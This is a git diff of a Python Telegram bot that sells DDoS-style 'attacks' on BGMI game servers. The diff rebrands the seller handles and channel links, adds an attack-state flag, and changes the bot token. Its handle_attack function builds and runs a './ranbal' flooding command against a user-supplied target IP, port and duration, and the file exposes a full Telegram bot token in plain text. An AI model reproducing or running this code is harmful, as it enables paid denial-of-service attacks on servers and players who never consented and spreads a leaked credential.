@@ -4,8 +4,9 @@ import datetime
 import os
 from keep_alive import keep_alive
 keep_alive()
+
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7846072513:AAEnen_EhJwApi86j3t2Cw9E9cMXSfgjWGw')
+bot = telebot.TeleBot('7846072513:AAEnen_EhJwApi86j3t2Cw9E9cMXSfgjWGw-0rkeDPZfY')
 
 # Admin user IDs
 admin_id = {"7083378335"}
@@ -15,6 +16,9 @@ USER_FILE = "users.txt"
 
 # File to store command logs
 LOG_FILE = "log.txt"
+
+# Global variable to track if an attack is running
+attack_running = False
 
 def read_users():
     try:
@@ -103,7 +107,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ."
     else:
-        response = "Mood ni hai abhi pelhe purchase kar isse:- @TREXVIVEK."
+        response = "Mood ni hai abhi pelhe purchase kar isse:- @GTX_GHOST."
 
     bot.reply_to(message , response)
 
@@ -130,9 +134,7 @@ def handle_attack(message):
             else:
                 attack_running = True  # Set the attack state to running
                 try:
-                    record_command_logs(user_id, '/chodo', target, port, time)
                     log_command(user_id, target, port, time)
-                    start_attack_reply(message, target, port, time)
 
                     # Run both commands side by side
                     ranbal_command = f"./ranbal {target} {port} {time} 800"
@@ -158,7 +160,6 @@ def handle_attack(message):
 
     bot.reply_to(message, response)
 
-        
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
@@ -193,7 +194,7 @@ def show_help(message):
 🤖 /admincmd : Shows All Admin Commands.
 
 Buy From :- @TREXVIVEK
-Official Channel :- https://t.me/+kRKyJDJYT_djZjZl
+Official Channel :- https://t.me/+HEyXXgA_1hU4NmZl
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -208,7 +209,7 @@ Official Channel :- https://t.me/+kRKyJDJYT_djZjZl
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''🔥SOMS ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
+    response = f'''🔥VIVEK ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
 🤗Try To Run This Command : /help 
 💵BUY :-@TREXVIVEK'''
     bot.reply_to(message, response)
@@ -220,7 +221,7 @@ def welcome_rules(message):
 
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
-3. MAKE SURE YOU JOINED https://t.me/+kRKyJDJYT_djZjZl OTHERWISE NOT WORK
+3. MAKE SURE YOU JOINED https://t.me/+HEyXXgA_1hU4NmZl OTHERWISE NOT WORK
 4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
